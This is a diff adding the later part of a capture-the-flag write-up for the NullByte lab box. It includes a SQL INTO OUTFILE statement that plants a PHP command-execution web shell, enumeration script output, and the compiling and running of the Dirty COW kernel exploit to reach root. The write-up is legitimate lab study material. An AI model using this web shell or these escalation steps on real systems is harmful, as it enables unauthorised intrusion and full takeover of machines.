@@ -303,7 +303,7 @@ Analyzing 'c6d6bd7ebf806f43c76acc3681703b81'
 
 I throw that into crackstation and we get it: "omega".  Wow, nice short password you lazy user, Ramses.
 
-### PWN User
+## PWN User
 
 Now I can just SSH in and I have user:
 
@@ -324,3 +324,166 @@ drwxr-xr-x 5 root   root   4096 Aug  2  2015 ..
 There's local.txt, grab the flag.
 
 Now here is where I like this box.  We did that, but we were root inside of phpMyAdmin.  Couldn't we have done something else?  Remember that uploads directory?  Was that a red herring?  I go back to phpMYAdmin and start poking again.  At the top there is a "SQL" tab.  Huh, so I can run SQL.  I already have the contents of the "seth" database though.  I've done other boxes where you trick SQL to run code.  And phpMyAdmin is written in PHP... can I get a PHP web shell?  I check my cheat sheet for PHP and SQL, but alas I have no notes on it.  So I do what everyone does: search the web.
+
+I finall come across this guy: ~[m4mshackers](http://m4mshackers.blogspot.com/2013/07/shell-uploading-through-phpmyadmin.html).  They're trying to do exactly what I am!  I also found this nicer looking shell: ![phpMyAdmin Shell](https://github.com/nullbind/Other-Projects/blob/master/random/phpMyAdminWebShell.sql)
+
+I try to use the latter shell:
+
+![nullbytehome](/images/nb8.png)
+
+Why won't you just work!  Ugh!  Time to actually read the eror message... looks like a permission issue.  Maybe I'll try /var/www?
+
+![nullbytehome](/images/nb9.png)
+
+I must not have wrote permission to /var/www/phpmyadmin or /var/www.  But hey, I already have user from SSH.  I'll navigate from that shell and see what the permissions are:
+
+```
+ramses@NullByte:~$ ls -al /var/www/
+total 16
+drwxr-xr-x  4 root root 4096 Aug  2  2015 .
+drwxr-xr-x 12 root root 4096 Aug  2  2015 ..
+drwxrwxrwx  2 root root 4096 Aug  2  2015 backup
+drwxr-xr-x  4 root root 4096 Aug  2  2015 html
+ramses@NullByte:~$ ls -al /var/www/html
+total 60
+drwxr-xr-x 4 root root  4096 Aug  2  2015 .
+drwxr-xr-x 4 root root  4096 Aug  2  2015 ..
+-rw-r--r-- 1 root root   196 Aug  2  2015 index.html
+drwxr-xr-x 2 root root  4096 Aug  2  2015 kzMb5nVYJw
+-rw-r--r-- 1 root root 16647 Aug  2  2015 main.gif
+-rw-r--r-- 1 root root 16628 May 24  2013 main.gif_original
+drwxrwxrwx 2 root root  4096 Aug  2  2015 uploads
+```
+
+Spankowitz, you dummy.  You blindly copied a shell from Github and didn't look at where it was trying to place it!  The error was telling you that the directory didn't exist, not that you didn't have permission.  Let's modify our little SQL command:
+
+>SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
+INTO OUTFILE ‘/var/www/html/uploads/cmd.php’
+
+![nullbytehome](/images/nb10.png)
+
+Success!  Let's test.
+
+![nullbytehome](/images/nb11.png)
+
+Excellent.  This was another way I could have gotten a shell.  This box has netcat on it, so I could spawn a shell right here.  We've identified 2 ways of getting user.
+
+##PWN root
+
+Now that we've got user 2 different ways, let's escalate our priviliges.  I try "sudo -l" but no luck.  Let's run the trusty linenum script.  Start a Python web server on the hacker box, bring it over to the victim and run it.  Highlights:
+
+```
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux
+[-] Kernel information (continued):
+Linux version 3.16.0-4-686-pae (debian-kernel@lists.debian.org) (gcc version 4.8.4 (Debian 4.8.4-1) ) #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17)
+
+[-] Are permissions on /home directories lax:
+total 20K
+drwxr-xr-x  5 root   root   4.0K Aug  2  2015 .
+drwxr-xr-x 21 root   root   4.0K Feb 20  2020 ..
+drwxr-xr-x  2 bob    bob    4.0K Mar  5  2020 bob
+drwxr-xr-x  2 eric   eric   4.0K Aug  2  2015 eric
+drwxr-xr-x  2 ramses ramses 4.0K Jul  9  2020 ramses
+
+[-] Process binaries and associated permissions (from above list):
+-rwxr-xr-x 1 root root  1105840 Nov 13  2014 /bin/bash
+lrwxrwxrwx 1 root root        4 Nov  8  2014 /bin/sh -> dash
+-rwxr-xr-x 1 root root   263704 May 27  2015 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root   538136 May 27  2015 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root   300612 May 27  2015 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root    34540 Mar 30  2015 /sbin/agetty
+lrwxrwxrwx 1 root root       20 May 27  2015 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root    76408 Aug 13  2014 /sbin/rpc.statd
+-rwxr-xr-x 1 root root    46908 Aug 18  2014 /sbin/rpcbind
+-rwxr-xr-x 1 root root   518888 May 28  2015 /usr/bin/dbus-daemon
+lrwxrwxrwx 1 root root        9 Mar 17  2015 /usr/bin/python -> python2.7
+-rwxr-xr-x 1 root root    47208 Feb 13  2015 /usr/bin/vmtoolsd
+-rwxr-xr-x 1 root root    50924 Nov  9  2014 /usr/sbin/acpid
+-rwxr-xr-x 1 root root   622468 Mar 15  2015 /usr/sbin/apache2
+-rwxr-xr-x 1 root root    21772 Sep 30  2014 /usr/sbin/atd
+-rwxr-xr-x 1 root root    43012 Oct 26  2014 /usr/sbin/cron
+-rwxr-xr-x 1 root root    55168 Jul  7  2015 /usr/sbin/cups-browsed
+-rwxr-xr-x 1 root root   497516 Jun  9  2015 /usr/sbin/cupsd
+-rwsr-xr-x 1 root root  1081076 Feb 18  2015 /usr/sbin/exim4
+-rwxr-xr-x 1 root root 11486816 Jul 16  2015 /usr/sbin/mysqld
+-rwxr-xr-x 1 root root    31012 Aug 13  2014 /usr/sbin/rpc.idmapd
+-rwxr-xr-x 1 root root   653088 Oct  2  2014 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root root   949144 Mar 23  2015 /usr/sbin/sshd
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/gcc
+```
+
+Note that the architecture is i686.  More on that in a bit.  Every user's home directory is readable, Python permissions are pretty lax.  We've got GCC installed.  Interesting that a compiler is installed.  Now I am no priv esc expert.  I'm building a cheat sheet for OSCP.  But I got nothing after looking at the above.  No interesting cron job, no weird files in the user's home directories, no odd binary running.  I'm out of ideas, so let's run another script: ![Linux Exploit Suggester](https://github.com/jondonas/linux-exploit-suggester-2)
+
+I copy the file over to the victim, add execute permission and let it go:
+
+```
+./les2.pl
+
+  #############################
+    Linux Exploit Suggester 2
+  #############################
+
+  Local Kernel: 3.16.0
+  Searching 72 exploits...
+
+  Possible Exploits
+  [1] dirty_cow
+      CVE-2016-5195
+      Source: http://www.exploit-db.com/exploits/40616
+  [2] exploit_x
+      CVE-2018-14665
+      Source: http://www.exploit-db.com/exploits/45697
+  [3] overlayfs
+      CVE-2015-8660
+      Source: http://www.exploit-db.com/exploits/39230
+```
+
+That was quick.  That's all?  I guess we'll try the first one.  I read the exploit.  Interesting.  It replaces /usr/bin/passwd with a payload, escalating your shell to root.  The author is nice and makes a backup of the really passwd for you so you don't completely brick the box.  It's written in C so we'll have to compile it.  Wait, didn't this box have GCC?  Sweet!
+
+Even though the box has GCC, I decide to compile it myself.  I copy the exploit to my attacker box and rerear the code.  I need to uncomment the correct payload (x86 or x64). I search the old interwebs and i686 is 32 bit, so we need the x86 payload.  Comment out the 64 bit and uncomment the 32 bit.  Ohhh we're gonna pwn root!
+
+I follow the command in the exploit and compile the code.  Then I transfer it to the victim (python web server).  I run the code, and nothing.  What?  Stupid Linux Explit Suggester.  I have a crappy netcat shell so I spawn a better shell to see if there are any errors (we saw python in linenum, so I used the python shell upgrade):
+
+>python -c 'import pty; pty.spawn("/bin/bash")'
+
+Ok... let's see the error.
+
+>bash: ./cowroot: cannot execute binary file: Exec format error
+
+Huh?  Why not!  I complied you, run dammit!  Time to search the interwebs for this error.  Quickly I discover it's a file and host architecture mismatch.  LEt's doubel check the file:
+
+```
+file cowroot
+cowroot: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aec4f878e26d93014e1c5c9ab60160916ef07dd5, for GNU/Linux 3.2.0, not stripped
+```
+
+64 bit?  The victim is 32 bit!  Why would you do that?!?!?  Whoever compiled this is in idiot!  Oh wait.  I compiled it.  Now, let me give a quick explanation.  As a blue teamer, I know the more a bad guy does on a system, the more chances I have to catch them.  In general, I try to do the most work on my attacker machine.  In this case, I compiled the file on my 64 bit VM, so GCC compiled it for my architecture.  Duh!  Now let's try again but specify 32 bit:
+
+>gcc -m32 40616.c -o cowroot32 -pthread
+
+Now, let's transfer that one to the victim and run it.
+
+```
+whoami
+www-data
+./cowroot32
+whoami
+root
+cd /root
+ls
+proof.txt
+```
+
+Victory!  I wonder if there were other ways to get root like there were other ways to get user?  What about those other 2 exploits?
